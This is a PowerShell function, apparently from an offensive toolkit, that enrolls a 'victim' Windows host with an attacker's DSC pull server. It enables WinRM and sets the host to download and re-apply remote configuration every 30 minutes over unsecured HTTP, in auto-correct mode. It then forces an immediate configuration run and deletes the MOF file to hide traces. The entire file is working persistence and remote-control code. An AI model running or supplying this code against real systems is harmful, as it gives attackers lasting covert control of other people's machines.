function Configure-Victim
{
<#
.SYNOPSIS

Registers victim host with DSC pull server

.DESCRIPTION

Registers victim machine with DSC server, downloads and applies specified configuration (GUID), and defines the local configuration manager (LCM)

.PARAMETER Guid

GUID to be used to pull the correct configuration (GUID is generated previously, server side, when the configuration is created). 

.PARAMETER DSCServer

Metwork address of the remote DSC server

.PARAMETER MofPath

Optional parameter of the temporary MOF file location. 
If  parameter is not supplied the file is written to C:\Windows\System32\Configuration\PullConfig.mof then deleted.


.EXAMPLE

PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.8.8

Description
-----------
Victim downloads configuration with GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d from the server at 8.8.8.8.

.EXAMPLE

PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.8.8 -MofPath C:\Temp\Temp.mof

Description
-----------

Victim downloads configuration with GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d from the server at 8.8.8.8.
Optional parameter 'MofPath' determines temporary mof file is written to 'C:\Temp\Temp.mof'.
Note: In both cases the mof file is temporary and deleted before script terminates.

.EXAMPLE

PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.8.8 -Port 443

Description
-----------

Victim downloads configuration with GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d from the server at 8.8.8.8.
Optional 'port' parameter determines the remote port where configuration is hosted
Note: If 'port' parameter is not used the default port is 8080


#>


    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(36, 36)]
        [String] $GUID,

        [Parameter(Mandatory = $True)]
        [String] $Server,

        [Parameter(Mandatory = $False)]
        [ValidatePattern('\.mof$')]
        [String] $MofPath = "C:\Windows\System32\Configuration\PullConfig.mof",

        [Parameter(Mandatory = $False)]
        [String] $Port = "8080"



    )


    Configuration ConfigurePullServer
    {
        param ($NodeId, $PullServer)    
 
        LocalConfigurationManager
        {
            AllowModuleOverwrite 			= $True
            ConfigurationID 				= $NodeId
            # Minutes between target policy being implemented
            ConfigurationModeFrequencyMins 	= 15 
            ConfigurationMode 				= 'ApplyAndAutoCorrect'
            # Minutes between pull server requests
            RefreshFrequencyMins 			= 30
            RebootNodeIfNeeded 				= $False
            RefreshMode 					= 'Pull'
            DownloadManagerName 			= 'WebDownloadManager'
            DownloadManagerCustomData 		= (@{ServerUrl = "http://${PullServer}:${Port}/psdscpullserver.svc"; 
                                            AllowUnsecureConnection = “TRUE”})
         
        }
    }
 
    winrm quickconfig -quiet

    Write-Host "Generating pull server configuration"
 
    ConfigurePullServer -NodeId $GUID -PullServer $Server -OutputPath $MOFPath 

    Write-Host "Applying pull server settings"

    Set-DscLocalConfigurationManager -path $MofPath -Verbose

    # Force DSC to implement config 
    Invoke-CimMethod -Namespace root/Microsoft/Windows/DesiredStateConfiguration -Cl MSFT_DSCLocalConfigurationManager -Method PerformRequiredConfigurationChecks -Arguments @{Flags = [System.UInt32]1}

    #Delete MOF file and directory
    Write-Host "Deleting MOF file"

    Remove-Item -Path $MofPath -Force -Recurse
}